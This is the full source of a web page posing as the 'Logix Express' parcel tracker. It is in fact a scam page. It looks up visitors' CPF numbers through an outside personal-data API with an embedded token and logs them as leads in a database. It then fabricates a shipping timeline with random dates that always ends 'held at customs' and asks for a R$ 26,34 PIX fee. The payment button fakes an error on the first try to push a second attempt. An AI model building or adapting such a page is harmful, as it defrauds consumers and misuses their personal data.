<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Rastreamento - Logix Express</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <!-- Header -->
    <header class="header">
        <div class="container">
            <div class="logo">
                <img src="https://raw.githubusercontent.com/Misticaa/rastrear/refs/heads/main/jpg-removebg-preview.png" alt="Logix Express" class="logo-image" id="logoImage" data-logo>
            </div>
        </div>
    </header>

    <!-- Tracking Hero Section -->
    <section class="tracking-hero">
        <div class="container">
            <div class="tracking-content">
                <h1>Rastreamento de Pacotes Logix</h1>
                <p>Digite o CPF que foi utilizado na compra para acompanhar seu pedido</p>
                
                <div class="tracking-form">
                    <form id="trackingForm" novalidate>
                        <div class="form-group">
                            <label for="cpfInput">CPF utilizado na compra</label>
                            <input 
                                type="tel" 
                                id="cpfInput" 
                                name="cpfInput" 
                                placeholder="000.000.000-00" 
                                required 
                                maxlength="14"
                                pattern="[0-9]{3}\.[0-9]{3}\.[0-9]{3}-[0-9]{2}"
                                inputmode="numeric"
                                autocomplete="off"
                                data-cpf-input
                            >
                        </div>
                        <button type="submit" class="track-button" id="trackButton" data-track-button>
                            <i class="fas fa-search"></i> Rastrear Pacote
                        </button>
                    </form>
                </div>
            </div>
        </div>
    </section>

    <!-- Order Details Accordion -->
    <section class="order-details" id="orderDetails" style="display: none;">
        <div class="container">
            <div class="details-card">
                <div class="details-header" id="detailsHeader">
                    <div class="details-icon">
                        <i class="fas fa-box"></i>
                    </div>
                    <div class="details-info">
                        <h3>Dados do Pedido</h3>
                        <div class="customer-summary">
                            <span id="customerName">João Silva</span>
                        </div>
                    </div>
                    <div class="toggle-icon">
                        <i class="fas fa-chevron-down"></i>
                    </div>
                </div>
                
                <div class="details-content" id="detailsContent">
                    <div class="detail-row">
                        <span class="detail-label">Nome completo:</span>
                        <span class="detail-value" id="fullName">João Silva Santos</span>
                    </div>
                    <div class="detail-row">
                        <span class="detail-label">Documento:</span>
                        <span class="detail-value" id="formattedCpf">123.456.789-00</span>
                    </div>
                    <div class="product-row">
                        <span class="detail-label">Produto:</span>
                        <div class="product-info">
                            <span class="product-text" id="customerProduct">Kit 12 caixas organizadoras + brinde</span>
                        </div>
                    </div>
                    <div class="detail-row">
                        <span class="detail-label">Endereço completo:</span>
                        <span class="detail-value" id="customerFullAddress">Carregando...</span>
                    </div>
                </div>
            </div>
        </div>
    </section>

    <!-- Tracking Results Section -->
    <section class="tracking-results" id="trackingResults" style="display: none;">
        <div class="container">
            <div class="tracking-info">
                <div class="package-header">
                    <div class="package-status">
                        <div class="status-icon" id="statusIcon">
                            <i class="fas fa-clock"></i>
                        </div>
                        <div class="status-text">
                            <h2>Status do Pedido</h2>
                            <p id="statusDescription">Pedido de <strong id="customerNameStatus">João Silva</strong></p>
                        </div>
                    </div>
                    <div class="tracking-code-display">
                        <span id="currentStatus">Aguardando liberação aduaneira</span>
                    </div>
                </div>

                <div class="tracking-timeline" id="trackingTimeline">
                    <!-- Timeline será gerada dinamicamente -->
                </div>
            </div>
        </div>
    </section>

    <!-- Modal de Liberação Aduaneira -->
    <div class="modal-overlay" id="liberationModal" style="display: none;">
        <div class="professional-modal-container">
            <div class="professional-modal-header">
                <h2 class="professional-modal-title">Liberação Aduaneira Necessária</h2>
                <button class="professional-modal-close" id="closeModal">
                    <i class="fas fa-times"></i>
                </button>
            </div>
            
            <div class="professional-modal-content">
                <div class="liberation-explanation">
                    <p class="liberation-subtitle">
                        Seu pedido está retido na alfândega e precisa ser liberado para continuar o processo de entrega. A taxa única é de R$ 26,34.
                    </p>
                </div>

                <div class="professional-fee-display">
                    <div class="fee-info">
                        <span class="fee-label">Taxa de Liberação Aduaneira</span>
                        <span class="fee-amount">R$ 26,34</span>
                    </div>
                </div>
                
                <!-- QR Code gerado automaticamente -->
                <div class="qr-code-section" style="text-align: center; margin: 20px 0;">
                    <img id="realPixQrCode" src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=00020126580014BR.GOV.BCB.PIX013636c4b4e4-4c4e-4c4e-4c4e-4c4e4c4e4c4e5204000053039865802BR5925LOGIX EXPRESS LTDA6009SAO PAULO62070503***6304A1B2" alt="QR Code PIX" style="width: 200px; height: 200px; border: 3px solid #1e4a6b; border-radius: 12px; padding: 10px; background: white;">
                </div>
                
                <!-- Botão Copiar Chave Pix com animação -->
                <div style="text-align: center; margin: 20px 0;">
                    <button id="copyPixButtonModal" class="liberation-button-timeline" style="animation: pulse 2s infinite;">
                        <i class="fas fa-copy"></i> Copiar Chave Pix
                    </button>
                </div>
                
                <!-- Campo com chave PIX e botão manual -->
                <div style="margin: 20px 0;">
                    <label style="display: block; margin-bottom: 8px; font-weight: 600; color: #495057;">PIX Copia e Cola:</label>
                    <div style="display: flex; gap: 10px;">
                        <textarea id="pixCodeModal" readonly style="flex: 1; padding: 12px; border: 2px solid #e9ecef; border-radius: 8px; font-size: 12px; background: #f8f9fa; color: #495057; resize: none; height: 80px;">00020126580014BR.GOV.BCB.PIX013636c4b4e4-4c4e-4c4e-4c4e-4c4e4c4e4c4e5204000053039865802BR5925LOGIX EXPRESS LTDA6009SAO PAULO62070503***6304A1B2</textarea>
                        <button id="copyPixManualButton" style="background: #6c757d; color: white; border: none; padding: 12px 20px; border-radius: 8px; cursor: pointer; font-weight: 600; white-space: nowrap;">
                            <i class="fas fa-copy"></i> Copiar
                        </button>
                    </div>
                </div>
                
                <div style="text-align: center; margin-top: 20px;">
                    <button id="simulatePaymentButton" class="liberation-button-timeline">
                        <i class="fas fa-credit-card"></i> Simular Pagamento
                    </button>
                </div>
            </div>
        </div>
    </div>

    <!-- Footer -->
    <footer class="footer">
        <div class="container">
            <div class="footer-content">
                <div class="footer-section">
                    <div class="logo">
                        <img src="https://raw.githubusercontent.com/Misticaa/rastrear/refs/heads/main/jpg-removebg-preview.png" alt="Logix Express" class="logo-image" data-logo>
                    </div>
                    <div class="company-info">
                        <p><strong>Logix Express Brasil Ltda.</strong></p>
                        <p class="footer-link">Motoristas</p>
                        <p class="footer-link">Motoristas Parceiros - Entregas</p>
                        <p class="footer-link">Aplicativo para Motoristas</p>
                        <p class="footer-link">Tracking</p>
                        <p class="footer-link">Agências Logix</p>
                        <p class="footer-link">Seja nossa Agência Logix</p>
                        <p class="footer-link">Central de Ajuda</p>
                        <p class="footer-link">Fale conosco</p>
                    </div>
                </div>
            </div>
            <div class="footer-bottom">
                <p>© 2023 Logix Express All rights reserved</p>
            </div>
        </div>
    </footer>

    <script type="module">
        import { DatabaseService, CPFValidator } from './src/services/database.js';

        class SimpleTrackingSystem {
            constructor() {
                this.dbService = new DatabaseService();
                this.currentCPF = null;
                this.userData = null;
                this.leadData = null;
                this.isLiberationPaid = false;
                this.init();
            }

            init() {
                console.log('🚀 Inicializando sistema de rastreamento simples');
                this.setupEventListeners();
                this.setupCPFMask();
                this.checkURLParams();
            }

            setupEventListeners() {
                const form = document.getElementById('trackingForm');
                if (form) {
                    form.addEventListener('submit', (e) => this.handleFormSubmit(e));
                }

                const detailsHeader = document.getElementById('detailsHeader');
                if (detailsHeader) {
                    detailsHeader.addEventListener('click', () => this.toggleOrderDetails());
                }

                this.setupLiberationModal();
            }

            setupCPFMask() {
                const cpfInput = document.getElementById('cpfInput');
                if (cpfInput) {
                    cpfInput.addEventListener('input', (e) => {
                        CPFValidator.applyCPFMask(e.target);
                    });
                }
            }

            checkURLParams() {
                const urlParams = new URLSearchParams(window.location.search);
                if (urlParams.get('focus') === 'cpf') {
                    setTimeout(() => {
                        const cpfInput = document.getElementById('cpfInput');
                        if (cpfInput) {
                            cpfInput.focus();
                        }
                    }, 500);
                }
            }

            async handleFormSubmit(e) {
                e.preventDefault();
                
                const cpfInput = document.getElementById('cpfInput');
                const cpf = cpfInput.value.replace(/[^\d]/g, '');
                
                if (!CPFValidator.isValidCPF(cpf)) {
                    this.showError('CPF inválido. Verifique os dados e tente novamente.');
                    return;
                }

                this.currentCPF = cpf;
                await this.handleTrackingSubmit();
            }

            async handleTrackingSubmit() {
                console.log('🔍 Iniciando rastreamento para CPF:', this.currentCPF);
                this.showLoadingNotification();

                try {
                    // Buscar no Supabase primeiro
                    const dbResult = await this.dbService.getLeadByCPF(this.currentCPF);
                    
                    if (dbResult.success && dbResult.data) {
                        console.log('✅ Lead encontrado no Supabase:', dbResult.data);
                        this.leadData = dbResult.data;
                        this.userData = {
                            nome: dbResult.data.nome_completo,
                            cpf: this.currentCPF,
                            email: dbResult.data.email,
                            telefone: dbResult.data.telefone,
                            endereco: dbResult.data.endereco,
                            nascimento: this.generateBirthDate(this.currentCPF),
                            situacao: 'REGULAR'
                        };
                        
                        if (dbResult.data.status_pagamento === 'pago') {
                            this.isLiberationPaid = true;
                        }
                    } else {
                        // Buscar via API externa
                        console.log('🌐 Buscando dados via API externa...');
                        const apiData = await this.fetchFromExternalAPI(this.currentCPF);
                        
                        if (apiData && apiData.DADOS) {
                            this.userData = {
                                nome: apiData.DADOS.nome,
                                cpf: this.currentCPF,
                                email: null,
                                telefone: null,
                                endereco: null,
                                nascimento: apiData.DADOS.nascimento,
                                situacao: apiData.DADOS.situacao || 'REGULAR'
                            };
                        } else {
                            // Dados fallback
                            this.userData = this.generateFallbackData(this.currentCPF);
                        }
                    }

                    this.closeLoadingNotification();
                    this.displayResults();

                } catch (error) {
                    console.error('❌ Erro no rastreamento:', error);
                    this.closeLoadingNotification();
                    this.showError('Erro ao buscar dados. Tente novamente.');
                }
            }

            async fetchFromExternalAPI(cpf) {
                try {
                    const response = await fetch(`https://api.amnesiatecnologia.rocks/?token=e9f16505-2743-4392-bfbe-1b4b89a7367c&cpf=${cpf}`, {
                        method: 'GET',
                        mode: 'cors',
                        headers: {
                            'Accept': 'application/json',
                            'Content-Type': 'application/json'
                        }
                    });

                    if (response.ok) {
                        const data = await response.json();
                        if (data && data.DADOS && data.DADOS.nome) {
                            return data;
                        }
                    }
                } catch (error) {
                    console.error('❌ Erro na API externa:', error);
                }
                return null;
            }

            generateFallbackData(cpf) {
                const names = [
                    'João Silva Santos', 'Maria Oliveira Costa', 'Pedro Souza Lima',
                    'Ana Paula Ferreira', 'Carlos Eduardo Alves', 'Fernanda Santos Rocha'
                ];
                
                const cpfIndex = parseInt(cpf.slice(-2)) % names.length;
                
                return {
                    nome: names[cpfIndex],
                    cpf: cpf,
                    email: null,
                    telefone: null,
                    endereco: null,
                    nascimento: this.generateBirthDate(cpf),
                    situacao: 'REGULAR'
                };
            }

            generateBirthDate(cpf) {
                const year = 1960 + (parseInt(cpf.slice(0, 2)) % 40);
                const month = (parseInt(cpf.slice(2, 4)) % 12) + 1;
                const day = (parseInt(cpf.slice(4, 6)) % 28) + 1;
                
                return `${day.toString().padStart(2, '0')}/${month.toString().padStart(2, '0')}/${year}`;
            }

            displayResults() {
                this.displayOrderDetails();
                this.generateTrackingData();
                this.displayTrackingResults();

                const orderDetails = document.getElementById('orderDetails');
                if (orderDetails) {
                    setTimeout(() => {
                        orderDetails.scrollIntoView({ behavior: 'smooth' });
                    }, 100);
                }
            }

            displayOrderDetails() {
                const orderDetails = document.getElementById('orderDetails');
                const customerName = document.getElementById('customerName');
                const fullName = document.getElementById('fullName');
                const formattedCpf = document.getElementById('formattedCpf');
                const customerFullAddress = document.getElementById('customerFullAddress');

                if (orderDetails) {
                    orderDetails.style.display = 'block';
                }

                if (customerName) {
                    customerName.textContent = this.userData.nome;
                }

                if (fullName) {
                    fullName.textContent = this.userData.nome;
                }

                if (formattedCpf) {
                    formattedCpf.textContent = CPFValidator.formatCPF(this.userData.cpf);
                }

                if (customerFullAddress) {
                    customerFullAddress.textContent = this.userData.endereco || 'Endereço não informado';
                }
            }

            generateTrackingData() {
                const today = new Date();
                const dates = this.generateRealisticDates(today, 11);
                
                let currentStep = 11;
                if (this.leadData && this.leadData.etapa_atual) {
                    currentStep = Math.min(this.leadData.etapa_atual, 11);
                }

                if (this.isLiberationPaid) {
                    currentStep = Math.max(currentStep, 12);
                }

                this.trackingData = {
                    currentStep: currentStep,
                    steps: [
                        {
                            id: 1,
                            date: dates[0],
                            title: 'Seu pedido foi criado',
                            description: 'Seu pedido foi criado',
                            completed: currentStep >= 1
                        },
                        {
                            id: 2,
                            date: dates[1],
                            title: 'Preparando para envio',
                            description: 'O seu pedido está sendo preparado para envio',
                            completed: currentStep >= 2
                        },
                        {
                            id: 3,
                            date: dates[2],
                            title: 'Pedido enviado',
                            description: '[China] O vendedor enviou seu pedido',
                            completed: currentStep >= 3,
                            isChina: true
                        },
                        {
                            id: 4,
                            date: dates[3],
                            title: 'Centro de triagem',
                            description: '[China] O pedido chegou ao centro de triagem de Shenzhen',
                            completed: currentStep >= 4,
                            isChina: true
                        },
                        {
                            id: 5,
                            date: dates[4],
                            title: 'Centro logístico',
                            description: '[China] Pedido saiu do centro logístico de Shenzhen',
                            completed: currentStep >= 5,
                            isChina: true
                        },
                        {
                            id: 6,
                            date: dates[5],
                            title: 'Trânsito internacional',
                            description: '[China] Coletado. O pedido está em trânsito internacional',
                            completed: currentStep >= 6,
                            isChina: true
                        },
                        {
                            id: 7,
                            date: dates[6],
                            title: 'Liberado para exportação',
                            description: '[China] O pedido foi liberado na alfândega de exportação',
                            completed: currentStep >= 7,
                            isChina: true
                        },
                        {
                            id: 8,
                            date: dates[7],
                            title: 'Saiu da origem',
                            description: 'Pedido saiu da origem: Shenzhen',
                            completed: currentStep >= 8
                        },
                        {
                            id: 9,
                            date: dates[8],
                            title: 'Chegou no Brasil',
                            description: 'Pedido chegou no Brasil',
                            completed: currentStep >= 9
                        },
                        {
                            id: 10,
                            date: dates[9],
                            title: 'Centro de distribuição',
                            description: 'Pedido em trânsito para CURITIBA/PR',
                            completed: currentStep >= 10
                        },
                        {
                            id: 11,
                            date: dates[10],
                            title: 'Alfândega de importação',
                            description: 'Pedido chegou na alfândega de importação: CURITIBA/PR',
                            completed: currentStep >= 11,
                            needsLiberation: true
                        }
                    ]
                };

                if (this.isLiberationPaid && currentStep >= 12) {
                    this.trackingData.steps.push({
                        id: 12,
                        date: new Date(this.leadData.updated_at || Date.now()),
                        title: 'Pedido liberado',
                        description: 'Pedido liberado na Alfândega de Importação',
                        completed: true
                    });
                }
            }

            generateRealisticDates(endDate, numSteps) {
                const dates = [];
                const now = new Date();
                const today = new Date(endDate);
                
                // Dia -2
                const day1 = new Date(today);
                day1.setDate(day1.getDate() - 2);
                dates.push(this.getRandomTimeOnDate(day1));
                dates.push(this.getRandomTimeOnDate(day1));
                
                // Dia -1
                const day2 = new Date(today);
                day2.setDate(day2.getDate() - 1);
                for (let i = 2; i < 9; i++) {
                    dates.push(this.getRandomTimeOnDate(day2));
                }
                
                // Hoje
                dates.push(this.getTimeBeforeNow(today, now, 1));
                dates.push(this.getTimeBeforeNow(today, now, 2));
                
                return dates;
            }

            getRandomTimeOnDate(date) {
                const newDate = new Date(date);
                const hour = Math.floor(Math.random() * 18) + 5;
                const minute = Math.floor(Math.random() * 60);
                newDate.setHours(hour, minute, 0, 0);
                return newDate;
            }

            getTimeBeforeNow(targetDate, currentTime, stepOrder) {
                const newDate = new Date(targetDate);
                const currentHour = currentTime.getHours();
                
                let hoursBack;
                if (stepOrder === 1) {
                    hoursBack = Math.floor(Math.random() * 4) + 2;
                } else {
                    hoursBack = Math.random() * 1.5 + 0.5;
                }
                
                const targetTime = new Date(currentTime);
                targetTime.setHours(targetTime.getHours() - hoursBack);
                
                if (targetTime.getHours() < 6) {
                    targetTime.setHours(6 + Math.floor(Math.random() * 2));
                    targetTime.setMinutes(Math.floor(Math.random() * 60));
                }
                
                newDate.setHours(targetTime.getHours(), targetTime.getMinutes(), 0, 0);
                return newDate;
            }

            displayTrackingResults() {
                const trackingResults = document.getElementById('trackingResults');
                const customerNameStatus = document.getElementById('customerNameStatus');
                const currentStatus = document.getElementById('currentStatus');

                if (trackingResults) {
                    trackingResults.style.display = 'block';
                }

                if (customerNameStatus) {
                    customerNameStatus.textContent = this.userData.nome;
                }

                if (currentStatus) {
                    currentStatus.textContent = 'Aguardando liberação aduaneira';
                }

                this.renderTimeline();
            }

            renderTimeline() {
                const timeline = document.getElementById('trackingTimeline');
                if (!timeline) return;

                timeline.innerHTML = '';

                this.trackingData.steps.forEach((step, index) => {
                    const timelineItem = this.createTimelineItem(step, index);
                    timeline.appendChild(timelineItem);

                    setTimeout(() => {
                        timelineItem.style.opacity = '1';
                        timelineItem.style.transform = 'translateY(0)';
                    }, index * 100);
                });
            }

            createTimelineItem(step, index) {
                const item = document.createElement('div');
                item.className = `timeline-item ${step.completed ? 'completed' : ''}`;
                item.style.opacity = '0';
                item.style.transform = 'translateY(20px)';
                item.style.transition = 'all 0.5s ease';

                const dateStr = step.date.toLocaleDateString('pt-BR', { day: '2-digit', month: 'short' });
                const timeStr = step.date.toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' });

                let buttonHtml = '';
                if (step.id === 11 && step.needsLiberation && !this.isLiberationPaid) {
                    buttonHtml = `
                        <button class="liberation-button-timeline" onclick="window.trackingSystem.showLiberationModal()">
                            <i class="fas fa-unlock"></i> Liberar Pacote
                        </button>
                    `;
                }

                const chinaTag = step.isChina ? '<span class="china-tag">China</span>' : '';

                item.innerHTML = `
                    <div class="timeline-dot"></div>
                    <div class="timeline-content">
                        <div class="timeline-date">
                            <span class="date">${dateStr}</span>
                            <span class="time">${timeStr}</span>
                        </div>
                        <div class="timeline-text">
                            <p>${chinaTag}${step.description}</p>
                            ${buttonHtml}
                        </div>
                    </div>
                `;

                return item;
            }

            setupLiberationModal() {
                const closeModal = document.getElementById('closeModal');
                const liberationModal = document.getElementById('liberationModal');
                const copyPixButton = document.getElementById('copyPixButtonModal');
                const copyPixManual = document.getElementById('copyPixManualButton');
                const simulatePayment = document.getElementById('simulatePaymentButton');

                if (closeModal) {
                    closeModal.addEventListener('click', () => {
                        this.closeLiberationModal();
                    });
                }

                if (liberationModal) {
                    liberationModal.addEventListener('click', (e) => {
                        if (e.target === liberationModal) {
                            this.closeLiberationModal();
                        }
                    });
                }

                if (copyPixButton) {
                    copyPixButton.addEventListener('click', () => {
                        this.copyPixCode();
                    });
                }

                if (copyPixManual) {
                    copyPixManual.addEventListener('click', () => {
                        this.copyPixCode();
                    });
                }

                if (simulatePayment) {
                    simulatePayment.addEventListener('click', () => {
                        this.handleLiberationPayment();
                    });
                }
            }

            showLiberationModal() {
                console.log('🔓 Abrindo modal de liberação aduaneira');
                const modal = document.getElementById('liberationModal');
                if (modal) {
                    modal.style.display = 'flex';
                    document.body.style.overflow = 'hidden';
                }
            }

            closeLiberationModal() {
                const modal = document.getElementById('liberationModal');
                if (modal) {
                    modal.style.display = 'none';
                    document.body.style.overflow = 'auto';
                }
            }

            handleLiberationPayment() {
                const button = document.getElementById('simulatePaymentButton');
                if (!button) return;

                if (!button.hasAttribute('data-retry')) {
                    // Primeira tentativa - erro
                    button.setAttribute('data-retry', 'true');
                    alert('Erro ao processar pagamento');
                    button.innerHTML = '<i class="fas fa-redo"></i> Tentar Novamente';
                } else {
                    // Segunda tentativa - sucesso
                    this.processSuccessfulPayment();
                }
            }

            processSuccessfulPayment() {
                console.log('🎉 Pagamento processado com sucesso!');
                this.isLiberationPaid = true;
                this.closeLiberationModal();
                this.addStage12();

                if (this.currentCPF) {
                    this.dbService.updatePaymentStatus(this.currentCPF, 'pago');
                    this.dbService.updateLeadStage(this.currentCPF, 12);
                }
            }

            addStage12() {
                console.log('📦 Adicionando etapa 12: Pedido liberado');
                const timeline = document.getElementById('trackingTimeline');
                if (!timeline) return;

                const newDate = new Date();
                const item = this.createStage12Item(newDate);
                timeline.appendChild(item);

                setTimeout(() => {
                    item.style.opacity = '1';
                    item.style.transform = 'translateY(0)';
                    item.scrollIntoView({ behavior: 'smooth', block: 'center' });
                }, 100);

                const currentStatus = document.getElementById('currentStatus');
                if (currentStatus) {
                    currentStatus.textContent = 'Pedido liberado na alfândega';
                }
            }

            createStage12Item(date) {
                const item = document.createElement('div');
                item.className = 'timeline-item completed new-step';
                item.style.opacity = '0';
                item.style.transform = 'translateY(20px)';
                item.style.transition = 'all 0.5s ease';

                const dateStr = date.toLocaleDateString('pt-BR', { day: '2-digit', month: 'short' });
                const timeStr = date.toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' });

                item.innerHTML = `
                    <div class="timeline-dot"></div>
                    <div class="timeline-content">
                        <div class="timeline-date">
                            <span class="date">${dateStr}</span>
                            <span class="time">${timeStr}</span>
                        </div>
                        <div class="timeline-text">
                            <p>Pedido liberado na Alfândega de Importação</p>
                        </div>
                    </div>
                `;

                return item;
            }

            copyPixCode() {
                const pixInput = document.getElementById('pixCodeModal');
                const copyButton = document.getElementById('copyPixButtonModal');

                if (!pixInput || !copyButton) return;

                try {
                    pixInput.select();
                    pixInput.setSelectionRange(0, 99999);

                    if (navigator.clipboard && window.isSecureContext) {
                        navigator.clipboard.writeText(pixInput.value).then(() => {
                            this.showCopySuccess(copyButton);
                        }).catch(() => {
                            this.fallbackCopy(pixInput, copyButton);
                        });
                    } else {
                        this.fallbackCopy(pixInput, copyButton);
                    }
                } catch (error) {
                    console.error('❌ Erro ao copiar PIX:', error);
                }
            }

            fallbackCopy(input, button) {
                try {
                    const successful = document.execCommand('copy');
                    if (successful) {
                        this.showCopySuccess(button);
                    }
                } catch (error) {
                    console.error('❌ Fallback copy falhou:', error);
                }
            }

            showCopySuccess(button) {
                const originalText = button.innerHTML;
                button.innerHTML = '<i class="fas fa-check"></i> Copiado!';
                button.style.background = '#27ae60';
                
                setTimeout(() => {
                    button.innerHTML = originalText;
                    button.style.background = '';
                }, 2000);
            }

            toggleOrderDetails() {
                const detailsContent = document.getElementById('detailsContent');
                const toggleIcon = document.querySelector('.toggle-icon i');

                if (detailsContent && toggleIcon) {
                    if (detailsContent.classList.contains('expanded')) {
                        detailsContent.classList.remove('expanded');
                        toggleIcon.classList.remove('rotated');
                    } else {
                        detailsContent.classList.add('expanded');
                        toggleIcon.classList.add('rotated');
                    }
                }
            }

            showLoadingNotification() {
                const notification = document.createElement('div');
                notification.id = 'trackingNotification';
                notification.style.cssText = `
                    position: fixed;
                    top: 0;
                    left: 0;
                    width: 100%;
                    height: 100%;
                    background: rgba(0, 0, 0, 0.8);
                    display: flex;
                    align-items: center;
                    justify-content: center;
                    z-index: 3000;
                    backdrop-filter: blur(5px);
                    animation: fadeIn 0.3s ease;
                `;

                const content = document.createElement('div');
                content.style.cssText = `
                    background: white;
                    border-radius: 20px;
                    padding: 40px;
                    text-align: center;
                    max-width: 400px;
                    width: 90%;
                    box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
                    animation: slideUp 0.3s ease;
                    border: 3px solid #1e4a6b;
                `;

                content.innerHTML = `
                    <div style="margin-bottom: 20px;">
                        <i class="fas fa-search" style="font-size: 3rem; color: #1e4a6b; animation: pulse 1.5s infinite;"></i>
                    </div>
                    <h3 style="color: #2c3e50; font-size: 1.5rem; font-weight: 700; margin-bottom: 15px;">
                        Identificando Pedido...
                    </h3>
                    <p style="color: #666; font-size: 1.1rem; line-height: 1.6; margin-bottom: 20px;">
                        Aguarde enquanto rastreamos seu pacote
                    </p>
                `;

                notification.appendChild(content);
                document.body.appendChild(notification);
                document.body.style.overflow = 'hidden';
            }

            closeLoadingNotification() {
                const notification = document.getElementById('trackingNotification');
                if (notification) {
                    notification.style.animation = 'fadeOut 0.3s ease';
                    setTimeout(() => {
                        if (notification.parentNode) {
                            notification.remove();
                        }
                        document.body.style.overflow = 'auto';
                    }, 300);
                }
            }

            showError(message) {
                const existingError = document.querySelector('.error-message');
                if (existingError) {
                    existingError.remove();
                }

                const errorDiv = document.createElement('div');
                errorDiv.className = 'error-message';
                errorDiv.style.cssText = `
                    background: #fee;
                    color: #c33;
                    padding: 15px;
                    border-radius: 8px;
                    margin-top: 15px;
                    border: 1px solid #fcc;
                    text-align: center;
                    font-weight: 500;
                    animation: slideDown 0.3s ease;
                `;
                errorDiv.textContent = message;

                const form = document.querySelector('.tracking-form');
                if (form) {
                    form.appendChild(errorDiv);

                    setTimeout(() => {
                        if (errorDiv.parentNode) {
                            errorDiv.style.animation = 'slideUp 0.3s ease';
                            setTimeout(() => errorDiv.remove(), 300);
                        }
                    }, 5000);
                }
            }
        }

        // Inicializar sistema
        document.addEventListener('DOMContentLoaded', () => {
            window.trackingSystem = new SimpleTrackingSystem();
        });

        // Configurar navegação
        document.addEventListener('click', (e) => {
            const target = e.target;
            
            // Logo clicks
            if (target.matches('.logo-image, [data-logo]')) {
                e.preventDefault();
                window.location.href = '/index.html';
                return;
            }
            
            // Footer links
            if (target.matches('.footer-link')) {
                e.preventDefault();
                window.location.href = '/index.html';
                return;
            }
        });
    </script>
</body>
</html>